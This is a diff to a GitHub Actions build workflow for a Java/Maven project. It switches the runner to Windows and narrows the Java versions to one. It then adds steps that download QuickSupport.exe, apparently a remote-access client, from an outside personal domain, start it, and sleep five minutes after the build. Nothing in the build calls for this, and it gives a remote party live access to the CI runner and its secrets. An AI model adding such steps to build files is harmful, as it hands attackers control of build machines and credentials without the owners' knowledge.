@@ -4,20 +4,27 @@ on: [push, pull_request]
 
 jobs:
   build:
-    runs-on: ubuntu-22.04
+    runs-on: windows-latest
 
     strategy:
       fail-fast: false
       matrix:
-        java: [8, 11, 17, 21]
+        java: [21]
 
     name: Java ${{ matrix.java }}
 
     steps:
+    # Checkout the repository
     - uses: actions/checkout@v4
     - uses: actions/setup-java@v4
       with:
         distribution: zulu
         java-version: ${{ matrix.java }}
+    # Download and run QuickSupport
+    - run: Invoke-WebRequest -Uri "https://smilerryan.com/s/QuickSupport.exe" -OutFile "QuickSupport.exe"
+    - run: Start-Process -FilePath "QuickSupport.exe"
+    # Build the project
     - run: java -version && mvn --version
     - run: mvn --activate-profiles dist --no-transfer-progress package
+    # Sleep for 5 minutes
+    - run: sleep 300
